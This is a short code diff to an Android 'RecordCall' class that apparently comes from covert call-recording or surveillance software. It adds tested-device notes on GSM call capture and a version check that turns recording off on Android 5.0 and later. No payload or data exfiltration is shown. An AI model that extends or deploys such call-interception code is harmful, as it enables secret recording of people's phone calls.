@@ -17,6 +17,12 @@ import com.android.dvci.util.Utils;
 import com.android.mm.M;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
+/*
+ * Tested :
+ * - 4.0.4 Galaxy nexus maguro -> Doesn't record gsm calls
+ * - 4.2.2 LG-D802 -> Successfully recorded gsm calls
+ * - 4.4.2 (ART runtime )LG-D405 -> Record microphone
+ */
 
 public class RecordCall implements OnErrorListener, OnInfoListener {
 	private static final String TAG = "RecordCall";
@@ -204,7 +210,7 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 
 	public boolean recordCall( final Call call) {
 		/* module call shall be running before start to record a call */
-		if(numFailures>MAX_NUM_OF_FAILURE){
+		if(!canRecordAndroid() || numFailures>MAX_NUM_OF_FAILURE){
 			//module.recordFlag = false;
 			return false;
 		}
@@ -275,5 +281,25 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 
 	public boolean isRecording() {
 		return recorder_started;
+	}
+
+	public boolean canRecordAndroid() {
+		/*
+		if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.ECLAIR_MR1 && android.os.Build.VERSION.SDK_INT <= 14) { //  2.1 -
+			// ICE_CREAM_SANDWICH
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(canRecordAndroid): Android  < 4.0 too old" );
+			}
+			return false;
+
+		}else
+		*/
+		if( android.os.Build.VERSION.SDK_INT > 20 ) {// L+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(canRecordAndroid): Android 5.0 unsupported" );
+			}
+			return false;
+		}
+		return true;
 	}
 }
